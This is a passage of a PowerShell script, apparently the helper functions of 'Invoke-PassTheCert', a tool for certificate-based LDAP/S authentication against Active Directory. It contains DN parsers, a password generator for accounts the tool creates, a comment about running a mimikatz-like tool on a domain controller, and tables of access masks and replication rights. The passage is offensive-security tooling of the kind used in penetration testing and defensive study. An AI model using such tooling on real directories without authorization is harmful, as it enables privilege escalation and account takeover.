# ==========================================
# ===     Helper Functions (Generic)     ===
# ==========================================


function _ShowBanner {

    <#
    
        .SYNOPSIS

            Displays the Invoke-PassTheCert Banner in the console.
    
        .LINK

            https://github.com/hIMEI29A/FigletFonts
        
        .LINK

            https://patorjk.com/software/taag/
        
    #>

    Write-Host ""
    
    Write-Host -ForegroundColor Red     "   _____                _                                   "
    Write-Host -ForegroundColor Red     "  |_   _|              | |                                  "
    Write-Host -ForegroundColor Red     "    | | _ ____   _____ | | _____                            "
    Write-Host -ForegroundColor Red     "    | ||  _ \ \ / / _ \| |/ / _ \  ______                   "
    Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______|                  "
    Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|                           "
    Write-Host -ForegroundColor Red     "                                                            "
    Write-Host -ForegroundColor Red     "   v1.0.3                                                   "
    Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _      "
    Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |     "
    Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_    "
    Write-Host -ForegroundColor Red     "  |  __/ _ / __/ __/ | | |  _ \ / _ \ |    / _ \ '__| __|  "
    Write-Host -ForegroundColor Red     "  | | | (_| \__ \__ \| | | | | |  __/ \__/\  __/ |  | |_    "
    Write-Host -ForegroundColor Red     "  \_|  \___ /___/___/\_/ |_| |_|\___|\____/\___|_|   \__|   "

    Write-Host                          ""
    Write-Host                          ""

    Write-Host -ForegroundColor Blue    "  Pure PowerShell Tool To Authenticate To An LDAP/S Server With A Certificate Through Schannel  "
    
    Write-Host                          ""
}


function _Helper-ShowHelpOfFunction {
    
    <#
    
        .SYNOPSIS

            ReGEX'ly shows the Get-Help of the specified function in the specified PowerShell script.

        .PARAMETER FunctionName

            [System.String] 
            
            The Name of the function whose Get-Help is to be retrieved.

        .PARAMETER HelpType

            [System.String] 
            
            The type of Get-Help to show for specified action (i.e. `Full`, `Detailed`, or `Examples`). Default is `Detailed`.

        .PARAMETER TranslateToInvokePassTheCertSyntax

            [System.Boolean] 
            
            Translate a private function's (e.g. `_Filter ...`, `IdentityDN`, `TargetDN`, `ObjectDN`) documentation to the `Invoke-PassTheCert` syntax (e.g. `Invoke-PassTheCert -Action 'Filter' ...`, `Identity`, `Target`, `Object`) (Optional)
            
            - If not specified, defaults to $true.

        .EXAMPLE

            _Helper-ShowHelpOfFunction -FunctionName '_Filter' -TranslateToInvokePassTheCertSyntax $false

            Shows the Detailed Get-Help of function `_Filter` in the specified PowerShell script, using the `_Filter` function's own syntax.

        .EXAMPLE

            _Helper-ShowHelpOfFunction -FunctionName '_Filter' -h

            Shows the Detailed Get-Help of function `_Filter` in the specified PowerShell script, translating its examples into the `Invoke-PassTheCert` syntax.

        .EXAMPLE

            _Helper-ShowHelpOfFunction -FunctionName '_Filter' -he

            Shows the Examples Get-Help of function `_Filter` in the specified PowerShell script, translating its examples into the `Invoke-PassTheCert` syntax.

        .EXAMPLE

            _Helper-ShowHelpOfFunction -FunctionName '_Filter' -hh

            Shows the Full Get-Help of function `_Filter` in the specified PowerShell script, translating its examples into the `Invoke-PassTheCert` syntax.

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Name of the function whose Get-Help is to be retrieved")]
        [System.String]$FunctionName,

        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the type of Get-Help to show for specified action (i.e. 'Full', 'Detailed', or 'Examples')")]
        [ValidateSet('Full', 'Detailed', 'Examples')]
        [PSDefaultValue(Help="Show 'Detailed' Get-Help of the specified action")]
        [System.String]$HelpType = 'Detailed',

        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the path of the PowerShell script from which to extract a function's Get-Help")]
        [PSDefaultValue(Help="Used to get the current script's path")]
        [System.String]$ScriptPath = 'Invoke-PassTheCert.ps1',

        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the boolean flag to translate the private function's examples to the 'Invoke-PassTheCert' syntax")]
        [PSDefaultValue(Help="Translate a private function's (e.g. '_Filter ...') examples to the 'Invoke-PassTheCert' syntax (e.g., 'Invoke-PassTheCert -Action 'Filter' ...)")]
        [System.Boolean]$TranslateToInvokePassTheCertSyntax = $true
    )

    # Get the current PS1 script path by default
    if ($ScriptPath -eq 'Invoke-PassTheCert.ps1') {
        if (-not $PSCommandPath) { $ScriptPath = $MyInvocation.MyCommand.Path } else { $ScriptPath = $PSCommandPath }
    }

    # Extract text of the function's definition through a multi-line mode (?ms) ReGEX, i.e. the text in the script matching '(function $FunctionName {.*?})'
    $Pattern = "(?ms)^(\s*function\s+$FunctionName\s+\{.*?\})\s+function"
    Write-Verbose "[*] Trying To Extract The Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script Using The Multiline ReGEX: $Pattern"
    $FunctionMatch = ([regex]::Match((Get-Content -Path $ScriptPath -Raw), $Pattern)).Groups[1];

    if ($FunctionMatch.Success) {
        Write-Verbose "[+] Successfully Retrieved Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script With Content:`r`n==========================================`r`n$($FunctionMatch.Value)`r`n====================================================";

        # Invoking the function's definition to make it available in the current session. 
        # Because 'Invoke-Expression' requires PowerShell script path, or a one-lined PowerShell string, we'll encode the string of our multi-lined function definition into a single-lined Base64 string.
        # Dirty, but handy ;)
        [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(
            [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(
                $FunctionMatch.Value
            ))
        )) | Invoke-Expression

        # Showing the Help of the function
        if ($HelpType.Trim().ToUpper() -eq 'FULL') { $FunctionHelp = Get-Help -Name $FunctionName -Full }
        if ($HelpType.Trim().ToUpper() -eq 'DETAILED') { $FunctionHelp = Get-Help -Name $FunctionName -Detailed }
        if ($HelpType.Trim().ToUpper() -eq 'EXAMPLES') { $FunctionHelp = Get-Help -Name $FunctionName -Examples }

        $FunctionHelpString = $FunctionHelp |Out-String

        Write-Verbose "[+] Successfully Retrieved Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script As:`r`n==========================================`r`n$FunctionHelpString`r`n====================================================";

        # When translating to 'Invoke-PassTheCert' syntax, the Get-Help's REMARKS section (if present) is no longer relevant
        # For some reasons, ($FunctionHelpString -contains 'REMARKS') doesn't work, hence using a 'Select-String -Pattern' workaround.
        if (($FunctionHelpString |Select-String -Pattern '(?i).*\s+REMARKS\s+.*') -ne $null) {
            $FunctionHelpString = ([regex]::Match(($FunctionHelpString), '(?ims)(.*)REMARKS\s+.*')).Groups[1].Value;
            Write-Verbose "[+] Successfully Stripped irrelevant 'REMARKS' Section Of Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script As:`r`n==========================================`r`n$($FunctionHelpString)`r`n====================================================";
        }

        # Each function's description contains its own way of executing itself. However, these are mostly *private* helper functions (prefixed '_').
        # For these functions to be reliable documentation, they should either be executed manually (e.g. copy-pasted into the powershell process), or executed using the context of 'Invoke-PassTheCert'.
        # For example, one example of the '_AddGroupMember' function, for action 'AddGroupMember', might be:
        #   _AddGroupMember -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -GroupDN 'CN=KindaGroupy,CN=Builtin,DC=X'

        # However, calling it requires either to manually import it into the the current PowerShell process (copy-pasting the code), or to use any of the two following 'Invoke-PassTheCert' syntax:
        #   Invoke-PassTheCert -LdapConnection $LdapConnection -Action 'AddGroupMember' -Identity 'CN=John JD. DOE,CN=Users,DC=X' -GroupDN 'CN=KindaGroupy,CN=Builtin,DC=X'

        # Therefore, we'll make the substitution for the user to conveniently get the right way of executing the action from 'Invoke-PassTheCert' if $TranslateToInvokePassTheCertSyntax is set ($true by default).
        if ($TranslateToInvokePassTheCertSyntax) {
            # Replace all occurrences of '_Action' to: Invoke-PassTheCert -Action 'Action'
            $FunctionHelpString = $FunctionHelpString -replace "_$Action", " Invoke-PassTheCert -Action '$Action'"
            # Replace all occurrences of '-IdentityDN' (resp. '-TargetDN', 'ObjectDN') to '-Identity' (resp. '-Target', 'Object'), as they MAY be identities OTHER THAN Distinguished Name.
            $FunctionHelpString = $FunctionHelpString -replace '-(Identity|Target|Object)DN','-$1'
            Write-Verbose "[+] Successfully Translated Get-Help Of Type '$HelpType' For Function '$FunctionName' In '$ScriptPath' PowerShell Script To The Invoke-PassTheCert Syntax As:`r`n==========================================`r`n$($FunctionHelpString)`r`n====================================================";
        }
        
        Write-Host $FunctionHelpString
    } else {
        Write-Host "[!] Could Not Retrieve Documentation Of Function '$FunctionName' In The '$ScriptPath' PowerShell Script !"
        Write-Host "[*] (Hint: Have You Specified The '-Action' Switch ? Otherwise, Does It Exist ? '-a' Can Be Used To List Available Actions)"
    }
}


function _Helper-ShowParametersOfFunction {
    
    <#
    
        .SYNOPSIS

            Verbose'ly shows the function's name and parameters' [key, value] pairs

        .PARAMETER FunctionName

            [System.String] 
            
            The name of the function

        .PARAMETER PSBoundParameters

            [System.Collections.Generic.Dictionary`2[System.String, System.Object]]
            
            The $PSBoundParameters variable of the function

        .EXAMPLE

            _Helper-ShowParametersOfFunction -FunctionName 'Foo' -PSBoundParameters $PSBoundParameters

            Verbose'ly shows the function named `Foo` name and the `$PSBoundParameters`'s parameters (i.e. its [key, value] pairs)

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Name of the function to display")]
        [System.String]$FunctionName,

        [Parameter(Position=1, Mandatory=$true, HelpMessage='Enter the $PSBoundParameters variable of the function whose [key, value] pairs must be shown')]
        [System.Collections.Generic.Dictionary`2[System.String, System.Object]]$PSBoundParameters
    )

    Write-Verbose "[*] Arguments Provided To Function '$FunctionName' Are: $(
        $PSBoundParameters.Keys |ForEach-Object {
            if ($PSBoundParameters[$_] -ne $null) {
                "`r`n    [$($PSBoundParameters[$_].GetType())]$($_): $($PSBoundParameters[$_])" 
            }
        }
    )"
}


function _Helper-GetRandomString {
    
    <#
    
        .SYNOPSIS

            Returns a Random String of the specified length and charset.

            - This function is used to generate random passwords for created user/computer accounts when no password is provided.
        
        .PARAMETER Length

            [System.Int32]
            
            The length (default: 120, i.e. 240 UTF-16 bytes).
            
            - The length has been empirically chosen after running a *kindak4tz.exe* command in the DC, where the `DC01$`:`Password` field contained 240 UTF-16 bytes, i.e. 120 characters.

        .PARAMETER Charset

            [System.String] 
            
            The Character Set (default: abcdefghjkmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ23456789~@#%^&*()_+={}][,./?;:<>).
        
            - If this parameter isn't specified, by default, only ASCII-printable characters are set, and the following characters excluded for convenience: !\`'"-$1il0O|I

        .EXAMPLE

            _Helper-GetRandomString

            Returns a random string of length 120 (default) using the default charset
            
        .EXAMPLE

            _Helper-GetRandomString -Length 32

            Returns a random string of length 32 using the default charset
        
        .EXAMPLE

            _Helper-GetRandomString -Length 32 -Charset 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_'

            Returns a random string of length 32 using the charset: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_
        
        .OUTPUTS

            [System.String] 
            
            A Random String of the specified length and charset.
    
        .LINK

            https://adsecurity.org/?p=280

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$false, HelpMessage="Enter the length of the random string to be generated")]
        [PSDefaultValue(Help="120 characters, i.e. 240 UTF-16 bytes, the default length for computer account passwords")]
        [System.Int32]$Length = 120,
        
        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the charset to be used for generating the random string")]
        [PSDefaultValue(Help='All printable ASCII characters (!\`''"-$1il0O|I excluded for convenience)')]
        #[System.String]$Charset = 'abcdefghjkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ23456789~@#%^&*()_+={}][,./?;:<>!\`''"-$1il0O|I'
        [System.String]$Charset = 'abcdefghjkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ23456789~@#%^&*()_+={}][,./?;:<>'
    )

    Write-Verbose "[*] Generating Random String Of Length $Length Using Charset: $Charset"

    if ($Length -lt 0) {
        Write-Verbose "[!] Length of Random String Must Be Greater Than 0 !"
        return $null;
    } elseif ($Length -eq 0) {
        Write-Verbose "[+] Successfully Returned Empty String '' ! (I Mean... You Asked For A String Of Length 0...)"
        return '';
    } else {
        $RandomString = -join ($Charset.ToCharArray() | Get-Random -Count $Length)
        Write-Verbose "[+] Successfully Generated Random String: $RandomString"
        return $RandomString;
    }
}


function _Helper-IsEveryValueOfArrayDefined {
    
    <#
    
        .SYNOPSIS

            Returns $true if every value of the provided array is defined, $false otherwise.
        
        .PARAMETER Array

            [System.Array]
            
            Array containing the value to check definition against.

        .EXAMPLE

            _Helper-IsEveryValueOfArrayDefined $Array

            Returns $true if every value of the $Array array is defined, $false otherwise
        
        .OUTPUTS

            [Boolean] 
            
            $true if every value of the provided array is defined, $false otherwise.

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the array in which to check if each value has been defined")]
        [System.Array]$Array
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    Write-Verbose "[*] Checking If Every Value In The Provided Array Is Defined..."
    foreach ($Value in $Array) {
        if (-not $Value) { return $false; }
    }
    return $true;
}


function _Helper-GetDomainDNFromDN {
    
    <#
    
        .SYNOPSIS

            Returns the Domain's Distinguished Name (i.e. from `DC=*`) extracted from an arbitrary Distinguished Name.

        .PARAMETER DN

            [System.String]

            The Distinguished Name to be parsed.

        .EXAMPLE

            _Helper-GetDomainDNFromDN -DN 'CN=Administrator,CN=Users,DC=X'

            Returns `DC=X`

        .EXAMPLE

            _Helper-GetDomainDNFromDN -DN 'CN=Administrator,CN=Users,DC=WORLD,DC=X'

            Returns `DC=WORLD,DC=X`

        .OUTPUTS

            [System.String] 
            
            The Domain's Distinguished Name extracted from an arbitrary Distinguished Name.

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Distinguished Name from which to extract the Domain's Distinguished Name")]
        [System.String]$DN
    )

    Write-Verbose "[*] Retrieving Distinguished Name Of Domain From Distinguished Name '$DN'..."

    $DNParts = $DN -split ','
    $DomainParts = @()
    foreach ($part in $DNParts) {
        if ($part.Trim().ToUpper().StartsWith('DC=')) {
            $DomainParts += $part.Trim()
        }
    }

    $DomainDN = $DomainParts -join ','
    Write-Verbose "[+] Successfully Retrieved Distinguished Name Of Domain '$DomainDN' From Distinguished Name '$DN' !"
    return $DomainDN;
}


function _Helper-GetDomainNameFromDN {
    
    <#

        .SYNOPSIS

            Returns the Domain Name extracted from an arbitrary Distinguished Name.

        .PARAMETER DN

            [System.String]

            The Distinguished Name to be parsed.

        .EXAMPLE

            _Helper-GetDomainNameFromDN -DN 'CN=Administrator,CN=Users,DC=X'

            Returns `X`

        .EXAMPLE

            _Helper-GetDomainNameFromDN -DN 'CN=Administrator,CN=Users,DC=WORLD,DC=X'

            Returns `WORLD.X`

        .OUTPUTS

            [System.String] 
            
            The Domain Name extracted from an arbitrary Distinguished Name.

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Distinguished Name from which to extract the Domain Name")]
        [System.String]$DN
    )

    Write-Verbose "[*] Retrieving Domain Name From Distinguished Name '$DN'..."

    $DNParts = $DN -split ','
    $DomainParts = @()
    foreach ($part in $DNParts) {
        if ($part.Trim().ToUpper().StartsWith('DC=')) {
            $DomainParts += $part.Trim().Substring(3)
        }
    }

    $Domain = $DomainParts -join '.'
    Write-Verbose "[+] Successfully Retrieved Domain Name '$Domain' From Distinguished Name '$DN' !"
    return $Domain;
}


function _Helper-GetDomainDNFromDomainName {
    
    <#

        .SYNOPSIS

            Returns the Domain Distinguished Name form of the specified domain name.

        .PARAMETER DomainName

            [System.String]

            The Domain Name

        .EXAMPLE

            _Helper-GetDomainNameFromDN -DomainName 'ADLAB.LOCAL'

            Returns `DC=ADLAB,DC=LOCAL`

        .OUTPUTS

            [System.String] 
            
            The Domain Distinguished Name form of the specified domain name.

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Domain Name to convert into Distinguished Name")]
        [System.String]$DomainName
    )

    Write-Verbose "[*] Retrieving Domain DN From Domain Name '$DomainName'..."

    $Result = 'DC='+"$DomainName" -split '\.' -join ',DC='

    Write-Verbose "[+] Successfully Retrieved Domain DN '$Result' From Domain Name '$DomainName' !"

    return $Result;
}


function _Helper-GetCNFromDN {
    
    <#

        .SYNOPSIS

            Returns the Common Name of the object identified by its Distinguished Name.

        .PARAMETER DN

            [System.String]
            
            The Distinguished Name to be parsed.

        .EXAMPLE

            _Helper-GetCNFromDN -DN 'CN=John JD. DOE,CN=Users,DC=X'

            Returns `John JD. DOE`

        .EXAMPLE

            _Helper-GetCNFromDN -DN 'CN=COMPUTATOR,CN=Computers,DC=WORLD,DC=X'

            Returns `COMPUTATOR`

        .OUTPUTS

            [System.String] 
            
            The Common Name of the object identified by its Distinguished Name.

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Distinguished Name from which to extract the Object's Common Name")]
        [System.String]$DN
    )

    Write-Verbose "[*] Retrieving Name Part From Distinguished Name '$DN'..."
    $Name = (("$DN" -split ',')[0] -split '=')[1]
    Write-Verbose "[+] Successfully Retrieved The '$Name' Name Part From Distinguished Name '$DN' !"
    return $Name;
}


function _Helper-GetTypeOfIdentityString {
    
    <#
    
        .SYNOPSIS

            Returns the *Type* String of the specified identity string through ReGEX parsing.
            
            - Returns 'UnknownType' if the type couldn't be ReGEX-identifiable.
            - Edge-case: the 'S-1-1-0' is a valid sAMAccountName AND SID. Therefore, such Identity String input WILL be identified as 'SID' (given priority), and NOT 'sAMAccountName'. In such a case, the DN, GUID, or (real) SID of the identity can be specified instead of the sAMAccountName.

        .PARAMETER IdentityString

            [System.String]

            The Identity String to be parsed (i.e. a Distinguished Name, sAMAccountName, SID, or GUID)

        .EXAMPLE

            _Helper-GetTypeOfIdentityString -IdentityString 'CN=Administrator,CN=Users,DC=X'

            Returns 'distinguishedName'

        .EXAMPLE

            _Helper-GetTypeOfIdentityString -IdentityString 'S-1-5-21-2539905369-2457893589-779357875-1151'

            Returns 'SID'

        .EXAMPLE

            _Helper-GetTypeOfIdentityString -IdentityString 'b330183a-4cd0-204c-b0bd-44a1fd1ebe12'

            Returns 'GUID'

        .EXAMPLE

            _Helper-GetTypeOfIdentityString -IdentityString 'jdoe'

            Returns 'sAMAccountName'

        .EXAMPLE

            _Helper-GetTypeOfIdentityString -IdentityString 'computer$'

            Returns 'sAMAccountName'

        .OUTPUTS

            [System.String]
            
            The *Type* String of the specified identity string through ReGEX parsing.

        .LINK 

            https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names

        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccountname

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/ad/naming-properties

        .LINK 

            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/naming-conventions-for-computer-domain-site-ou

        .LINK

            https://datatracker.ietf.org/doc/html/rfc1123

        .LINK

            https://datatracker.ietf.org/doc/html/rfc4514#section-3

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the identity string to be parsed")]
        [System.String]$IdentityString
    )

    # The only Identity String allowed to get spaces is a DN.
    # Striping its spaces before / after ',' or '=' has no effect in identifying the DN. In other words, "DC=  ADLAB  ,   DC= LOCAL" and "DC=ADLAB,DC=LOCAL" points to the same identity.
    # Also, trimming any Identity String has no effect either.
    $IdentityString = ($IdentityString -replace '\s*(,|=)\s*','$1').Trim()

    Write-Verbose "[*] ReGEX'ly retrieving *Type* String Of Identity String '$IdentityString'..."

    # Default value
    $Result = 'UnknownType'

    # If the Identity String contains '=', it can ONLY be a Distinguished Name.
    if ($IdentityString -ilike '*=*') {
        $Result = 'distinguishedName';
    }
    # If the Identity String is like 'S-\d-\d-\d.*', it's *most likely* an SID.
    # Edge-case: If the sAMAccountName is 'S-1-1-0' (a valid one!), we CAN'T identify it as 'sAMAccountName'. DN, GUID or SID of the object should be used instead of sAMAccountName
    elseif ($IdentityString -match '^S-(\d-){2}\d+.*') {
        $Result = 'SID';
    }
    # If the Identity String is like 'a2345678-A234-b234-B234-c23456789012', it's a GUID.
    # This CAN'T edge-case with sAMAccountName, as it is limited to 20 characters MAXIMUM.
    elseif ($IdentityString -match '[a-zA-Z0-9]{8}-([a-zA-Z0-9]{4}-){3}[a-zA-Z0-9]{12}') {
        $Result = 'GUID';
    }
    # Otherwise, the Identity String is a sAMAccountName if it is 20 characters MAXIMUM, and DOES NOT contain any of the followings: " / \ [ ] : ; | = , + * ? < >
    elseif (-not ($IdentityString -match '["/\\\[\]:;|=,+*?<>]') -and $IdentityString.Length -le 20) {
        $Result = 'sAMAccountName';
    }
    
    if ($Result -eq 'UnknownType') {
        Write-Verbose "[!] *Type* String Of Identity String '$IdentityString' through ReGEX Couldn't Be Found ! Returning '$Result'...";
    } else {
        Write-Verbose "[+] Successfully Retrieved *Type* String '$Result' Of Identity String '$IdentityString' !";
    }
    return $Result;
}


function _Helper-GetBinaryFromHexString {
    
    <#
    
        .SYNOPSIS

            Returns the binary blob from a hexadecimal string.

        .PARAMETER HexString

            [System.String]

            The Hexadecimal string

        .EXAMPLE

            _Helper-GetBinaryFromHex -HexString '1011'

            Returns [48, 49]

        .OUTPUTS

            [byte[]]
            
            The binary blob from a hexadecimal string.

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the hexadecimal string to be converted to binary")]
        [System.String]$HexString
    )
    
    $Result = @()
    for($i=0; $i -lt $HexString.Length; $i+=2) { 
        $Result += [Convert]::ToByte($HexString.Substring($i,2),16) 
    }
    
    return [byte[]]$Result
}


# ========================================================
# ===  Helper Functions (UAC, Access Mask, ACE, SDDL)  ===
# ========================================================


function _Helper-GetUACFlagsArray {
    
    <#

        .SYNOPSIS

            Returns the Array of all possible UAC Flags

        .LINK

            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties

    #>
    
    return @{
	    "SCRIPT" = 0x0001;
	    "ACCOUNTDISABLE" = 0x0002;
	    "HOMEDIR_REQUIRED" = 0x0008;
	    "LOCKOUT" = 0x0010;
	    "PASSWD_NOTREQD" = 0x0020;
	    "PASSWD_CANT_CHANGE" = 0x0040;
        "ENCRYPTED_TEXT_PWD_ALLOWED" = 0x0080;
	    "TEMP_DUPLICATE_ACCOUNT" = 0x0100;
	    "NORMAL_ACCOUNT" = 0x0200;
	    "INTERDOMAIN_TRUST_ACCOUNT" = 0x0800;
	    "WORKSTATION_TRUST_ACCOUNT" = 0x1000;
	    "SERVER_TRUST_ACCOUNT" = 0x2000;
	    "DONT_EXPIRE_PASSWORD" = 0x10000;
	    "MNS_LOGON_ACCOUNT" = 0x20000;
	    "SMARTCARD_REQUIRED" = 0x40000;
	    "TRUSTED_FOR_DELEGATION" = 0x80000;
	    "NOT_DELEGATED" = 0x100000;
	    "USE_DES_KEY_ONLY" = 0x200000;
	    "DONT_REQ_PREAUTH" = 0x400000;
	    "PASSWORD_EXPIRED" = 0x800000;
	    "TRUSTED_TO_AUTH_FOR_DELEGATION" = 0x1000000;
	    "PARTIAL_SECRETS_ACCOUNT" = 0x04000000;
    }
}


function _Helper-GetAccessMasksArray {
    
    <#

        .SYNOPSIS

            Returns the Array of all possible Access Masks

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights

    #>
    
    return @{
        "CreateChild" = 1;
        "DeleteChild" = 2;
        "ListChildren" = 4;
        "Self" = 8;
        "ReadProperty" = 16;
        "WriteProperty" = 32;
        "DeleteTree" = 64;
        "ListObject" = 128;
        "ExtendedRight" = 256;
        "Delete" = 65536;
        "ReadControl" = 131072;
        "GenericExecute" = 131076;
        "GenericWrite" = 131112;
        "GenericRead" = 131220;
        "WriteDacl" = 262144;
        "WriteOwner" = 524288;
        "GenericAll" = 983551;
        "Synchronize" = 1048576;
        "AccessSystemSecurity" = 16777216;
    }
}


function _Helper-GetACEAccessRightsArray {
    
    <#

        .SYNOPSIS

            Returns the Array of all possible ObjectAceType (Control Access Rights ONLY)

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/adschema/control-access-rights

    #>
    
    return @{
        "Abandon-Replication" = "ee914b82-0a98-11d1-adbb-00c04fd8d5cd";
        "Add-GUID" = "440820ad-65b4-11d1-a3da-0000f875ae0d";
        "Allocate-Rids" = "1abd7cf8-0a99-11d1-adbb-00c04fd8d5cd";
        "Allowed-To-Authenticate" = "68b1d179-0d15-4d4f-ab71-46152e79a7bc";
        "Apply-Group-Policy" = "edacfd8f-ffb3-11d1-b41d-00a0c968f939";
        "Certificate-AutoEnrollment" = "a05b8cc2-17bc-4802-a710-e7c15ab866a2";
        "Certificate-Enrollment" = "0e10c968-78fb-11d2-90d4-00c04f79dc55";
        "Change-Domain-Master" = "014bf69c-7b3b-11d1-85f6-08002be74fab";
        "Change-Infrastructure-Master" = "cc17b1fb-33d9-11d2-97d4-00c04fd8d5cd";
        "Change-PDC" = "bae50096-4752-11d1-9052-00c04fc2d4cf";
        "Change-Rid-Master" = "d58d5f36-0a98-11d1-adbb-00c04fd8d5cd";
        "Change-Schema-Master" = "e12b56b6-0a95-11d1-adbb-00c04fd8d5cd";
        "Create-Inbound-Forest-Trust" = "e2a36dc9-ae17-47c3-b58b-be34c55ba633";
        "DNS-Host-Name-Attributes" = "72e39547-7b18-11d1-adef-00c04fd8d5cd";
        "DS-Bypass-Quota" = "88a9933e-e5c8-4f2a-9dd7-2527416b8092";
        "DS-Check-Stale-Phantoms" = "69ae6200-7f46-11d2-b9ad-00c04f79f805";
        "DS-Clone-Domain-Controller" = "3e0f7e18-2c7a-4c10-ba82-4d926db99a3e";
        "DS-Execute-Intentions-Script" = "2f16c4a5-b98e-432c-952a-cb388ba33f2e";
        "DS-Install-Replica" = "9923a32a-3607-11d2-b9be-0000f87a36b2";
        "DS-Query-Self-Quota" = "4ecc03fe-ffc0-4947-b630-eb672a8a9dbc";
        "DS-Read-Partition-Secrets" = "084c93a2-620d-4879-a836-f0ae47de0e89";
        "DS-Replication-Get-Changes" = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2";
        "DS-Replication-Get-Changes-All" = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2";
        "DS-Replication-Get-Changes-In-Filtered-Set" = "89e95b76-444d-4c62-991a-0facbeda640c";
        "DS-Replication-Manage-Topology" = "1131f6ac-9c07-11d1-f79f-00c04fc2dcd2";
        "DS-Replication-Monitor-Topology" = "f98340fb-7c5b-4cdb-a00b-2ebdfa115a96";
        "DS-Replication-Synchronize" = "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2";
        "DS-Set-Owner" = "4125c71f-7fac-4ff0-bcb7-f09a41325286";
        "DS-Validated-Write-Computer" = "9b026da6-0d3c-465c-8bee-5199d7165cba";
        "DS-Write-Partition-Secrets" = "94825a8d-b171-4116-8146-1e34d8f54401";
        "Do-Garbage-Collection" = "fec364e0-0a98-11d1-adbb-00c04fd8d5cd";
        "Domain-Administer-Server" = "ab721a52-1e2f-11d0-9819-00aa0040529b";
        "Domain-Other-Parameters" = "b8119fd0-04f6-4762-ab7a-4986c76b3f9a";
        "Domain-Password" = "c7407360-20bf-11d0-a768-00aa006e0529";
        "Email-Information" = "E45795B2-9455-11d1-AEBD-0000F80367C1";
        "Enable-Per-User-Reversibly-Encrypted-Password" = "05c74c5e-4deb-43b4-bd9f-86664c2a7fd5";
        "General-Information" = "59ba2f42-79a2-11d0-9020-00c04fc2d3cf";
        "Generate-RSoP-Logging" = "b7b1b3de-ab09-4242-9e30-9980e5d322f7";
        "Generate-RSoP-Planning" = "b7b1b3dd-ab09-4242-9e30-9980e5d322f7";
        "MS-TS-GatewayAccess" = "ffa6f046-ca4b-4feb-b40d-04dfee722543";
        "Manage-Optional-Features" = "7c0e2a7c-a419-48e4-a995-10180aad54dd";
        "Membership" = "bc0ac240-79a9-11d0-9020-00c04fc2d4cf";
        "Migrate-SID-History" = "ba33815a-4f93-4c76-87f3-57574bff8109";
        "Open-Address-Book" = "a1990816-4298-11d1-ade2-00c04fd8d5cd";
        "Personal-Information" = "77B5B886-944A-11d1-AEBD-0000F80367C1";
        "Private-Information" = "91e647de-d96f-4b70-9557-d63ff4f3ccd8";
        "Public-Information" = "e48d0154-bcf8-11d1-8702-00c04fb96050";
        "RAS-Information" = "037088f8-0ae1-11d2-b422-00a0c968f939";
        "Read-Only-Replication-Secret-Synchronization" = "1131f6ae-9c07-11d1-f79f-00c04fc2dcd2";
        "Reanimate-Tombstones" = "45ec5156-db7e-47bb-b53f-dbeb2d03c40f";
        "Recalculate-Hierarchy" = "0bc1554e-0a99-11d1-adbb-00c04fd8d5cd";
        "Recalculate-Security-Inheritance" = "62dd28a8-7f46-11d2-b9ad-00c04f79f805";
        "Receive-As" = "ab721a56-1e2f-11d0-9819-00aa0040529b";
        "Refresh-Group-Cache" = "9432c620-033c-4db7-8b58-14ef6d0bf477";
        "Reload-SSL-Certificate" = "1a60ea8d-58a6-4b20-bcdc-fb71eb8a9ff8";
